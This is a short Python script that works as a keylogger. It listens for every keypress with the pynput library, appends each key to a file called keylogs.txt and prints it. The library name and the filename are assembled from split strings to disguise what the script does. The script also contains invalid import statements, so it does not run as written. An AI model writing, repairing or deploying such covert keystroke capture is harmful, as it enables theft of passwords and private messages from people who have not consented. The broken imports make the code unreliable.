import __import__('p'+'y'+'n'+'p'+'u'+'t') as x
from x import keyboard
def on_press(key):
    try:
        with open(''.join(['k','e','y','l','o','g','s','.','t','x','t']), 'a') as f:
            f.write(key.char)
        print(f'Alphanumeric key pressed: {key.char}')
    except AttributeError:
        with open(''.join(['k','e','y','l','o','g','s','.','t','x','t']), 'a') as f:
            f.write(str(key))
        print(f'Special key pressed: {str(key)}')
hook = keyboard.Listener(on_press=on_press)
hook.start()
hook.join()